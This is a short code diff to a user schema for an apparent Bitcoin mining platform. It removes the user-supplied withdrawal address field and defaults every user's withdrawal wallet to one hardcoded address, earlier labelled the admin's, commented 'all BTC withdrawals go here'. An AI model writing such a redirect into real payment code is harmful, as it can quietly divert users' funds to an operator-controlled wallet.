@@ -120,20 +120,17 @@ export const userSchema = z.object({
   approvalDate: z.date().nullable().optional(),
   rejectionReason: z.string().nullable().optional(),
   
-  // Admin has a hardware wallet, users don't need one
-  hardwareWalletAddress: z.string().nullable().optional(),
+  // Platform hardware wallet address - all BTC withdrawals go here
+  hardwareWalletAddress: z.string().default("bc1qfavnkrku005m4kdkvdtgthur4ha06us2lppdps"),
   
-  // Users provide their withdrawal address
-  withdrawalAddress: z.string().nullable().optional(), 
+  // Platform tera rewards address
+  teraWalletAddress: z.string().default("bc1qj93mnxgm0xuwyh3jvvqurjxjyq8uktg4y0sad6"),
   
   // Mining balances
   miningBalance: z.string().default("0"),             // Current mining balance in satoshis
   totalEarned: z.string().default("0"),               // Total earnings in satoshis
   totalPaid: z.string().default("0"),                 // Total payouts in satoshis
   pendingPayouts: z.string().default("0"),            // Pending payouts in satoshis
-  
-  // Admin wallet is hardcoded for the admin
-  adminWalletAddress: z.string().default("bc1qfavnkrku005m4kdkvdtgthur4ha06us2lppdps").optional(),
   
   // Two-factor authentication settings
   totpEnabled: z.boolean().default(false),         // TOTP-based 2FA enabled flag
